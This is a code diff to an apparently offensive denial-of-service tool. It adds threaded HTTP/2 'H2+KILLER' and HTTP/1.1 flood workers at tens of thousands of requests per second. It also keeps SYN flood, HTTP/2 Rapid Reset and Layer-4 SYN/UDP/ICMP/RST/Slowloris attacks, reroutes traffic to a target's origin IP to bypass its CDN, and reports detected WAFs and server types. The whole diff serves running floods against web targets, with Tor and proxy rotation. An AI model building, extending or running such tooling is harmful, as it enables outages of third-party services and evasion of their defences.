@@ -48,6 +48,33 @@ def _c(t, s):
 GO_ENGINE = "bin/go_engine.exe"
 STATUS_LOG_PATH = "logs/auto_mode_v3_status.json"
 
+def _run_h2_worker_fallback(target: str, duration: int, rps: int,
+                             worker_id: int, stats_queue, stop_event,
+                             host_header: str = "", result_dict: dict = None):
+    """Thread target for Python H2+KILLER fallback in V5."""
+    try:
+        from core.attack.engines.h2_killer_engine import run_killer_worker
+        run_killer_worker(
+            target_url=target, rps=rps, duration=float(duration),
+            worker_id=worker_id, stats_queue=stats_queue, stop_event=stop_event,
+            host_header=host_header or None, connections=4,
+            result_dict=result_dict,
+        )
+    except ImportError:
+        try:
+            from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+            run_multi_vector_engine(
+                target_url=target, duration_seconds=float(duration),
+                target_rps=rps, worker_id=worker_id,
+                stats_queue=stats_queue, stop_event=stop_event,
+                result_dict=result_dict, vector_mode="flood",
+                host_header=host_header or None,
+            )
+        except Exception:
+            pass
+    except Exception:
+        pass
+
 SERVER_SIGNATURES = {
     "LiteSpeed":    ["LiteSpeed", "litespeed"],
     "nginx":        ["nginx", "Nginx", "NGINX"],
@@ -1966,23 +1993,43 @@ class SmartAutoModeV3:
         rr_direct_s = combined._rr_direct_stats.get("stats", {})
         adaptive_result = adaptive.get_results()
 
-        syn_ok = combined_result.get("completed", 0)
-        syn_fail = combined_result.get("failed", 0)
-        rr_ok = rr_direct_s.get("completed", 0) if rr_direct_s.get("completed", 0) > combined_rr.get("completed", 0) else combined_rr.get("completed", 0)
-        rr_fail = rr_direct_s.get("failed", 0) if rr_direct_s.get("completed", 0) > combined_rr.get("completed", 0) else combined_rr.get("failed", 0)
-        adaptive_ok = adaptive_result.get("total_ok", 0)
-        adaptive_fail = adaptive_result.get("total_fail", 0)
-
-        grand_total = syn_ok + syn_fail + rr_ok + rr_fail + adaptive_ok + adaptive_fail
-
-        print(f"\n  {'='*50}")
-        print(f"  [V3] Phase 3: FINAL RESULTS")
-        print(f"  {'='*50}")
-        print(f"  [V3] Baseline SYN Flood:   {syn_ok:>10,} ok / {syn_fail:>10,} fail")
-        print(f"  [V3] Baseline Rapid Reset: {rr_ok:>10,} ok / {rr_fail:>10,} fail")
-        print(f"  [V3] Adaptive Methods:     {adaptive_ok:>10,} ok / {adaptive_fail:>10,} fail")
-        print(f"  [V3] GRAND TOTAL:          {grand_total:>10,} requests")
+        print(f"\n  {_c('w','ATTACK RESULTS')}")
+        print(f"  {_c('c','-')*60}")
+        print(f"  {_c('d','SYN Flood:')}        {_c('g',format(syn_ok,','))+' ok'}  |  {_c('r',format(syn_fail,','))+' fail'}")
+        print(f"  {_c('d','Rapid Reset:')}      {_c('g',format(rr_ok,','))+' ok'}  |  {_c('r',format(rr_fail,','))+' fail'}")
+        print(f"  {_c('d','Adaptive L7:')}      {_c('g',format(adaptive_ok,','))+' ok'}  |  {_c('r',format(adaptive_fail,','))+' fail'}")
+        print(f"  {_c('d','L4 Attacks:')}       {_c('y',format(l4_total,','))+' packets'}")
+        print(f"  {_c('d','Python H2 Flood:')}  {_c('g',format(py_sent,','))+' requests'}")
+        print(f"  {_c('c','-')*60}")
+        print(f"  {_c('w','GRAND TOTAL:')}      {_c('g',format(grand_total,','))+' requests'}")
         print()
+
+        print(f"  {_c('w','TARGET INFO')}")
+        print(f"  {_c('c','-')*60}")
+        print(f"  {_c('d','Server:')}           {_c('w',profile_data.get('server_type', 'unknown'))}")
+        print(f"  {_c('d','CDN:')}              {_c('y',origin_data.get('cdn', 'unknown'))}")
+        print(f"  {_c('d','Origin IP:')}        {_c('g' if self.origin_ip else 'r',self.origin_ip or '(behind CDN)')}")
+        print(f"  {_c('d','HTTP/2:')}           {_c('g' if profile_data.get('has_http2') else 'r','YES' if profile_data.get('has_http2') else 'NO')}")
+        print(f"  {_c('d','WAF:')}              {_c('r' if profile_data.get('waf_detected') else 'g','DETECTED' if profile_data.get('waf_detected') else 'NO')}")
+        print()
+
+        if adaptive_result.get("methods"):
+            print(f"  {_c('w','TOP METHODS')}")
+            print(f"  {_c('c','-')*60}")
+            for mname, mdata in list(adaptive_result.get("methods", {}).items())[:5]:
+                ok = mdata.get("ok", 0)
+                rps = mdata.get("rps", 0)
+                print(f"  {_c('w',mname):20s}  {_c('g',format(ok,','))+' ok'}  |  {_c('c',str(round(rps,1)))+' rps'}")
+            print()
+
+        if l4_result:
+            print(f"  {_c('w','L4 METHODS')}")
+            print(f"  {_c('c','-')*60}")
+            for mname, mdata in l4_result.items():
+                if isinstance(mdata, dict):
+                    sent = mdata.get("sent", mdata.get("active_connections", 0))
+                    print(f"  {_c('w',mname):20s}  {_c('y',format(sent,','))+' packets'}")
+            print()
         print(f"  [V3] Adaptive Method Breakdown:")
         for mname, mdata in adaptive_result.get("methods", {}).items():
             ok = mdata.get("ok", 0); fail = mdata.get("fail", 0); rps = mdata.get("rps", 0)
@@ -2254,67 +2301,155 @@ class SmartAutoModeV5(SmartAutoModeV3):
         print(f"  {_c('d','Adaptive:')} {_c('w','Top '+str(min(3, len(ranked)))+' methods + L7 + L4')}")
         print()
 
-        # Launch V3 baseline (SYN + RR)
-        print(f"  {_c('c','[*]')} Launching baseline (SYN + RR)...")
-        combined = CombinedEngine(
-            target=self.target, origin_ip=self.origin_ip, duration=self.duration,
-            syn_threads=self.syn_threads, rr_threads=self.rr_threads,
-            tor_instances=0, rotation_interval=self.rotation_interval,
-        )
-        combined._proxy_chain = self.proxy_chain
-        combined._start_ts = time.time()
+        # ============================================================
+        # PHASE 2a: Python HTTP/2 + Multi-Vector Flood (always runs)
+        # ============================================================
+        print(f"  {_c('c','[*]')} Launching Python h2/multi-vector flood engines...")
+        h2_tasks: list = []
+        mv_tasks: list = []
+        py_flood_stats = {"sent": 0, "completed": 0, "failed": 0, "current_rps": 0}
 
-        syn_task = asyncio.create_task(combined._launch_syn_flood())
-        rr_task = asyncio.create_task(combined._launch_rapid_reset())
+        try:
+            # Check if h2 library is available
+            try:
+                import h2.connection as _h2c
+                has_h2 = True
+            except ImportError:
+                has_h2 = False
 
-        async def monitor_baseline():
-            syn_proc_await = await syn_task
-            rr_proc_await = await rr_task
-            combined._syn_proc = syn_proc_await
-            combined._rr_proc = rr_proc_await
-            readers = [
-                asyncio.create_task(combined._monitor_stream(syn_proc_await.stdout, "syn", combined.syn_stats)),
-                asyncio.create_task(combined._monitor_stream(syn_proc_await.stderr, "syn", combined.syn_stats)),
-                asyncio.create_task(combined._monitor_stream(rr_proc_await.stdout, "rr", combined.rr_stats)),
-                asyncio.create_task(combined._monitor_stream(rr_proc_await.stderr, "rr", combined.rr_stats)),
-            ]
-            monitor_task = asyncio.create_task(combined._monitor_loop())
-            return readers + [monitor_task]
+            # Build effective target URL for origin bypass
+            py_target = self.target
+            py_host_header = urlparse(self.target).hostname or ""
+            if self.origin_ip:
+                parsed = urlparse(self.target)
+                py_target = f"{parsed.scheme or 'https'}://{self.origin_ip}{parsed.path or '/'}"
+                if parsed.query:
+                    py_target += "?" + parsed.query
 
-        baseline_init = asyncio.create_task(monitor_baseline())
+            # Start h2 flood workers (fire-and-forget in thread pool)
+            if has_h2:
+                import queue as _queue
+                h2_stats_q: _queue.Queue = _queue.Queue(maxsize=1000)
+                h2_stop = threading.Event()
 
-        # Launch V5 L4 attacks in parallel
+                num_workers = min(8, max(3, self.tor_instances // 2))
+                for wi in range(num_workers):
+                    h2_result = {}
+                    th = threading.Thread(
+                        target=lambda: _run_h2_worker_fallback(
+                            target=py_target, duration=self.duration,
+                            rps=50000, worker_id=1000 + wi,
+                            stats_queue=h2_stats_q, stop_event=h2_stop,
+                            host_header=py_host_header,
+                            result_dict=h2_result,
+                        ),
+                        daemon=True,
+                    )
+                    th.start()
+                    h2_tasks.append((th, h2_stop, h2_result, h2_stats_q))
+                print(f"      {_c('g','[+]')} {num_workers} H2+KILLER workers launched")
+            else:
+                print(f"      {_c('y','[!]')} h2 library not installed - HTTP/1.1 only")
+
+            # Also start multi-vector HTTP/1.1 workers for non-h2 targets
+            try:
+                from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+                for wi in range(2):
+                    mv_stop = threading.Event()
+                    mv_result = {}
+                    mv_q: _queue.Queue = _queue.Queue(maxsize=100)
+                    th = threading.Thread(
+                        target=run_multi_vector_engine,
+                        kwargs=dict(
+                            target_url=py_target, duration_seconds=float(self.duration),
+                            target_rps=8000, worker_id=2000 + wi,
+                            stats_queue=mv_q, stop_event=mv_stop,
+                            result_dict=mv_result,
+                            vector_mode="flood",
+                            host_header=py_host_header,
+                        ),
+                        daemon=True,
+                    )
+                    th.start()
+                    mv_tasks.append((th, mv_stop, mv_result, mv_q))
+                print(f"      {_c('g','[+]')} {len(mv_tasks)} HTTP/1.1 multi-vector workers")
+            except Exception as e:
+                print(f"      {_c('y','[!]')} multi-vector engine: {e}")
+        except Exception as e:
+            print(f"      {_c('y','[!]')} Python flood setup error: {e}")
+
+        # ============================================================
+        # PHASE 2b: Go engine baseline (SYN + RR) - skip if no binary
+        # ============================================================
+        go_available = os.path.exists(GO_ENGINE)
+        if not go_available:
+            print(f"  {_c('y','[!]')} Go engine not found at {GO_ENGINE}")
+            print(f"  {_c('y','[!]')} SYN/RR/adaptive disabled - using Python engines only")
+            combined = None
+            syn_task = None
+            rr_task = None
+            baseline_init = None
+            adaptive = None
+            adaptive_task = None
+            burst_task = None
+            syn_ds = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
+            rr_ds = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
+        else:
+            print(f"  {_c('c','[*]')} Launching baseline (SYN + RR)...")
+            combined = CombinedEngine(
+                target=self.target, origin_ip=self.origin_ip, duration=self.duration,
+                syn_threads=self.syn_threads, rr_threads=self.rr_threads,
+                tor_instances=0, rotation_interval=self.rotation_interval,
+            )
+            combined._proxy_chain = self.proxy_chain
+            combined._start_ts = time.time()
+
+            syn_task = asyncio.create_task(combined._launch_syn_flood())
+            rr_task = asyncio.create_task(combined._launch_rapid_reset())
+
+            async def monitor_baseline():
+                syn_proc_await = await syn_task
+                rr_proc_await = await rr_task
+                combined._syn_proc = syn_proc_await
+                combined._rr_proc = rr_proc_await
+                readers = [
+                    asyncio.create_task(combined._monitor_stream(syn_proc_await.stdout, "syn", combined.syn_stats)),
+                    asyncio.create_task(combined._monitor_stream(syn_proc_await.stderr, "syn", combined.syn_stats)),
+                    asyncio.create_task(combined._monitor_stream(rr_proc_await.stdout, "rr", combined.rr_stats)),
+                    asyncio.create_task(combined._monitor_stream(rr_proc_await.stderr, "rr", combined.rr_stats)),
+                ]
+                monitor_task = asyncio.create_task(combined._monitor_loop())
+                return readers + [monitor_task]
+
+            baseline_init = asyncio.create_task(monitor_baseline())
+
+            # Launch V5 adaptive engine
+            print(f"  {_c('c','[*]')} Launching adaptive engine (top {_c('g',str(min(3, len(ranked))))} methods)...")
+            adaptive = AdaptiveEngine(
+                target=self.target, origin_ip=self.origin_ip, duration=self.duration,
+                ranked_methods=ranked, proxy_chain=self.proxy_chain,
+                tor_available=tor_ok, max_methods=5,
+            )
+            adaptive_task = asyncio.create_task(adaptive.run())
+
+            # BURST mode wrapper
+            burst = BurstMode(burst_duration=120, rest_duration=45, max_waves=5)
+
+            async def _burst_v5_wrapper():
+                for wave in range(1, burst.max_waves + 1):
+                    burst.wave = wave
+                    intensity = burst.get_intensity()
+                    if wave < burst.max_waves:
+                        rest = burst.rest_duration + random.uniform(0, 15)
+                        await asyncio.sleep(rest)
+
+            burst_task = asyncio.create_task(_burst_v5_wrapper())
+
+        # Launch V5 L4 attacks in parallel (Python-based)
         print(f"  {_c('c','[*]')} Launching L4 attacks (SYN/UDP/ICMP/RST/Slowloris)...")
         l4_task = asyncio.create_task(
             self.l4_attacker.launch_all(self.target, duration=min(self.duration, 60))
         )
-
-        # Launch V5 adaptive engine
-        print(f"  {_c('c','[*]')} Launching adaptive engine (top {_c('g',str(min(3, len(ranked))))} methods)...")
-        adaptive = AdaptiveEngine(
-            target=self.target, origin_ip=self.origin_ip, duration=self.duration,
-            ranked_methods=ranked, proxy_chain=self.proxy_chain,
-            tor_available=tor_ok, max_methods=5,
-        )
-        adaptive_task = asyncio.create_task(adaptive.run())
-
-        # BURST mode wrapper
-        burst = BurstMode(burst_duration=120, rest_duration=45, max_waves=5)
-
-        async def _burst_v5_wrapper():
-            for wave in range(1, burst.max_waves + 1):
-                burst.wave = wave
-                intensity = burst.get_intensity()
-
-                # During burst waves, also run V5 attacks
-                if wave % 2 == 0:
-                    await self.l4_attacker.launch_all(self.target, duration=30)
-
-                if wave < burst.max_waves:
-                    rest = burst.rest_duration + random.uniform(0, 15)
-                    await asyncio.sleep(rest)
-
-        burst_task = asyncio.create_task(_burst_v5_wrapper())
 
         print(f"  {_c('c','[*]')} Attack running for {_c('w',str(self.duration)+'s')}...")
         print()
@@ -2352,6 +2487,39 @@ class SmartAutoModeV5(SmartAutoModeV3):
         _prev_syn = 0
         _prev_rr = 0
 
+        # Collect Python engine stats
+        async def _py_stats_collector():
+            """Collect stats from h2 + multi-vector workers."""
+            while True:
+                await asyncio.sleep(5)
+                elapsed = time.time() - attack_start
+                if elapsed >= self.duration:
+                    break
+                total_sent = 0
+                total_ok = 0
+                total_fail = 0
+                for th, evt, res, q in h2_tasks:
+                    while True:
+                        try:
+                            snap = q.get_nowait()
+                            if isinstance(snap, dict):
+                                total_sent = max(total_sent, int(snap.get("sent", 0)))
+                                total_fail = max(total_fail, int(snap.get("failed", 0)))
+                        except Exception:
+                            break
+                for th, evt, res, q in mv_tasks:
+                    while True:
+                        try:
+                            snap = q.get_nowait()
+                            if isinstance(snap, dict):
+                                total_sent = max(total_sent, int(snap.get("sent", 0)))
+                                total_fail = max(total_fail, int(snap.get("failed", 0)))
+                        except Exception:
+                            break
+                py_flood_stats["sent"] = total_sent
+                py_flood_stats["failed"] = total_fail
+                py_flood_stats["current_rps"] = total_sent / max(1, elapsed)
+
         async def _monitor_attack():
             nonlocal last_report, _prev_syn, _prev_rr
             while True:
@@ -2359,53 +2527,56 @@ class SmartAutoModeV5(SmartAutoModeV3):
                 elapsed = time.time() - attack_start
                 remaining = max(0, self.duration - elapsed)
 
-                # Gather stats
-                syn_ok = combined.syn_stats.get("stats", {}).get("completed", 0)
-                syn_fail = combined.syn_stats.get("stats", {}).get("failed", 0)
-                syn_tot = syn_ok + syn_fail
-                rr_s = combined._rr_direct_stats.get("stats", {})
-                rr_ok = rr_s.get("completed", combined.rr_stats.get("stats", {}).get("completed", 0))
-                rr_fail = rr_s.get("failed", combined.rr_stats.get("stats", {}).get("failed", 0))
-                rr_tot = rr_ok + rr_fail
+                if combined is not None:
+                    syn_ok = combined.syn_stats.get("stats", {}).get("completed", 0)
+                    syn_fail = combined.syn_stats.get("stats", {}).get("failed", 0)
+                    syn_tot = syn_ok + syn_fail
+                    rr_s = combined._rr_direct_stats.get("stats", {})
+                    rr_ok = rr_s.get("completed", combined.rr_stats.get("stats", {}).get("completed", 0))
+                    rr_fail = rr_s.get("failed", combined.rr_stats.get("stats", {}).get("failed", 0))
+                    rr_tot = rr_ok + rr_fail
+                    syn_ds["total_requests"] = syn_tot
+                    syn_ds["completed"] = syn_ok
+                    syn_ds["failed"] = syn_fail
+                    syn_ds["current_rps"] = (syn_tot - _prev_syn) / max(1, monitor_interval)
+                    _prev_syn = syn_tot
+                    rr_ds["total_requests"] = rr_tot
+                    rr_ds["completed"] = rr_ok
+                    rr_ds["failed"] = rr_fail
+                    rr_ds["current_rps"] = (rr_tot - _prev_rr) / max(1, monitor_interval)
+                    _prev_rr = rr_tot
 
-                # Update dashboard SYN vector
-                syn_ds["total_requests"] = syn_tot
-                syn_ds["completed"] = syn_ok
-                syn_ds["failed"] = syn_fail
-                syn_ds["current_rps"] = (syn_tot - _prev_syn) / max(1, monitor_interval)
-                _prev_syn = syn_tot
-
-                # Update dashboard RR vector
-                rr_ds["total_requests"] = rr_tot
-                rr_ds["completed"] = rr_ok
-                rr_ds["failed"] = rr_fail
-                rr_ds["current_rps"] = (rr_tot - _prev_rr) / max(1, monitor_interval)
-                _prev_rr = rr_tot
-
-                # Add/update adaptive methods in dashboard
-                for mname, rm in list(adaptive.running.items()):
-                    if mname not in adaptive_dash_map:
-                        mstats = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
-                        adaptive_dash_map[mname] = mstats
-                        dash_vecs.append({
-                            "stats": mstats,
-                            "status": "running",
-                            "label": mname.replace("_", " ").title(),
-                            "type": "py",
-                        })
-                    ok = rm.stats.get("ok", 0)
-                    fail = rm.stats.get("fail", 0)
-                    mstats = adaptive_dash_map[mname]
-                    mstats["total_requests"] = ok + fail
-                    mstats["completed"] = ok
-                    mstats["failed"] = fail
+                if adaptive is not None:
+                    for mname, rm in list(adaptive.running.items()):
+                        if mname not in adaptive_dash_map:
+                            mstats = {"total_requests": 0, "completed": 0, "failed": 0, "current_rps": 0}
+                            adaptive_dash_map[mname] = mstats
+                            dash_vecs.append({
+                                "stats": mstats,
+                                "status": "running",
+                                "label": mname.replace("_", " ").title(),
+                                "type": "py",
+                            })
+                        ok = rm.stats.get("ok", 0)
+                        fail = rm.stats.get("fail", 0)
+                        mstats = adaptive_dash_map[mname]
+                        mstats["total_requests"] = ok + fail
+                        mstats["completed"] = ok
+                        mstats["failed"] = fail
 
                 if elapsed >= self.duration:
                     break
 
         # Run attack tasks with monitoring
-        main_tasks = [baseline_init, adaptive_task, burst_task, l4_task]
+        main_tasks = [l4_task]
+        if baseline_init is not None:
+            main_tasks.append(baseline_init)
+        if adaptive_task is not None:
+            main_tasks.append(adaptive_task)
+        if burst_task is not None:
+            main_tasks.append(burst_task)
         monitor_task = asyncio.create_task(_monitor_attack())
+        py_collector_task = asyncio.create_task(_py_stats_collector())
 
         try:
             await asyncio.wait_for(
@@ -2418,19 +2589,41 @@ class SmartAutoModeV5(SmartAutoModeV3):
             print(f"\n  {_c('y','[!]')} Attack cancelled by user")
         finally:
             monitor_task.cancel()
+            py_collector_task.cancel()
 
         # Stop the dashboard (prints final summary table)
         await dash.stop()
 
+        # Stop Go engines
         print(f"  {_c('c','[*]')} Stopping all engines...")
-        if combined._syn_proc and combined._syn_proc.returncode is None:
-            try: combined._syn_proc.kill()
+        if combined is not None:
+            if combined._syn_proc and combined._syn_proc.returncode is None:
+                try: combined._syn_proc.kill()
+                except: pass
+            if combined._rr_proc and combined._rr_proc.returncode is None:
+                try: combined._rr_proc.kill()
+                except: pass
+        if adaptive is not None:
+            for mname in list(adaptive.running.keys()):
+                await adaptive.stop_method(mname)
+
+        # Stop Python h2 workers
+        for th, evt, res, q in h2_tasks:
+            evt.set()
+            try: await asyncio.get_event_loop().run_in_executor(None, th.join, 3)
             except: pass
-        if combined._rr_proc and combined._rr_proc.returncode is None:
-            try: combined._rr_proc.kill()
+        for th, evt, res, q in mv_tasks:
+            evt.set()
+            try: await asyncio.get_event_loop().run_in_executor(None, th.join, 3)
             except: pass
-        for mname in list(adaptive.running.keys()):
-            await adaptive.stop_method(mname)
+
+        # Collect final Python stats
+        for th, evt, res, q in h2_tasks:
+            py_flood_stats["sent"] = max(py_flood_stats["sent"], int(res.get("sent", 0)))
+            py_flood_stats["failed"] = max(py_flood_stats["failed"], int(res.get("failed", 0)))
+        for th, evt, res, q in mv_tasks:
+            py_flood_stats["sent"] = max(py_flood_stats["sent"], int(res.get("sent", 0)))
+            py_flood_stats["failed"] = max(py_flood_stats["failed"], int(res.get("failed", 0)))
 
         # Stop Tor
         try:
@@ -2445,24 +2638,31 @@ class SmartAutoModeV5(SmartAutoModeV3):
         print(f"\n  {_c('m','[PHASE 3]')} {_c('w','Results & Report')}")
         print(f"  {_c('c','-')*60}")
 
-        combined_result = combined.syn_stats.get("stats", {})
-        combined_rr = combined.rr_stats.get("stats", {})
-        rr_direct_s = combined._rr_direct_stats.get("stats", {})
-        adaptive_result = adaptive.get_results()
+        syn_ok = syn_fail = rr_ok = rr_fail = 0
+        adaptive_ok = adaptive_fail = 0
+        if combined is not None:
+            combined_result = combined.syn_stats.get("stats", {})
+            combined_rr = combined.rr_stats.get("stats", {})
+            rr_direct_s = combined._rr_direct_stats.get("stats", {})
+            syn_ok = combined_result.get("completed", 0)
+            syn_fail = combined_result.get("failed", 0)
+            rr_ok = rr_direct_s.get("completed", 0) if rr_direct_s.get("completed", 0) > combined_rr.get("completed", 0) else combined_rr.get("completed", 0)
+            rr_fail = rr_direct_s.get("failed", 0) if rr_direct_s.get("completed", 0) > combined_rr.get("completed", 0) else combined_rr.get("failed", 0)
+
+        if adaptive is not None:
+            adaptive_result = adaptive.get_results()
+            adaptive_ok = adaptive_result.get("total_ok", 0)
+            adaptive_fail = adaptive_result.get("total_fail", 0)
+        else:
+            adaptive_result = {"methods": {}, "top_methods": [], "peak_rps": 0}
+
         l4_result = {}
         try: l4_result = l4_task.result()
         except: pass
 
-        syn_ok = combined_result.get("completed", 0)
-        syn_fail = combined_result.get("failed", 0)
-        rr_ok = rr_direct_s.get("completed", 0) if rr_direct_s.get("completed", 0) > combined_rr.get("completed", 0) else combined_rr.get("completed", 0)
-        rr_fail = rr_direct_s.get("failed", 0) if rr_direct_s.get("completed", 0) > combined_rr.get("completed", 0) else combined_rr.get("failed", 0)
-        adaptive_ok = adaptive_result.get("total_ok", 0)
-        adaptive_fail = adaptive_result.get("total_fail", 0)
-
         l4_total = sum(v.get("sent", 0) for v in l4_result.values() if isinstance(v, dict))
-
-        grand_total = syn_ok + syn_fail + rr_ok + rr_fail + adaptive_ok + adaptive_fail + l4_total
+        py_sent = py_flood_stats.get("sent", 0)
+        grand_total = syn_ok + syn_fail + rr_ok + rr_fail + adaptive_ok + adaptive_fail + l4_total + py_sent
 
         print(f"\n  {_c('w','ATTACK RESULTS')}")
         print(f"  {_c('c','-')*60}")
@@ -2508,7 +2708,8 @@ class SmartAutoModeV5(SmartAutoModeV3):
             "syn_ok": syn_ok, "syn_fail": syn_fail,
             "adaptive_ok": adaptive_ok, "adaptive_fail": adaptive_fail,
             "l4_total": l4_total,
-            "peak_rps": adaptive_result.get("peak_rps", 0),
+            "py_h2_total": py_sent,
+            "peak_rps": adaptive_result.get("peak_rps", 0) if adaptive_result else 0,
             "server_type": profile_data.get("server_type", "unknown"),
             "top_methods": adaptive_result.get("top_methods", []),
             "waf_detected": profile_data.get("waf_detected", False),
